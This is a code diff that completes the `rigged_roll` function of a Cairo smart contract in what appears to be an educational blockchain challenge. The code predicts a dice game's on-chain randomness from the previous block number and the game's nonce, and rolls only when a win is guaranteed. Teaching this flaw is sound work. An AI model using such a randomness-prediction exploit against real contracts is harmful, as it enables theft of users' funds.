@@ -52,7 +52,20 @@ mod RiggedRoll {
     impl RiggedRollImpl of super::IRiggedRoll<ContractState> {
         // ToDo Checkpoint 2: Implement the `rigged_roll()` function to predict the randomness in
         // the DiceGame contract and only initiate a roll when it guarantees a win.
-        fn rigged_roll(ref self: ContractState, amount: u256) {}
+        fn rigged_roll(ref self: ContractState, amount: u256) {
+            assert!(self.dice_game.read().eth_token_dispatcher().balanceOf(get_contract_address()) >= 2000000000000000, "Not enough ETH");
+            let prev_block: u256 = get_block_number().into() - 1;
+            let nonce = self.dice_game.read().nonce();
+            
+            let array = array![prev_block, nonce];
+            let roll = keccak_u256s_le_inputs(array.span()) % 16;
+            self.predicted_roll.write(roll);
+            if roll > 5 {
+                return;
+            }            
+
+            self.dice_game.read().roll_dice(amount);
+        }
 
         // ToDo Checkpoint 3: Implement the `withdraw` function to transfer Ether from the rigged
         // contract to a specified address.
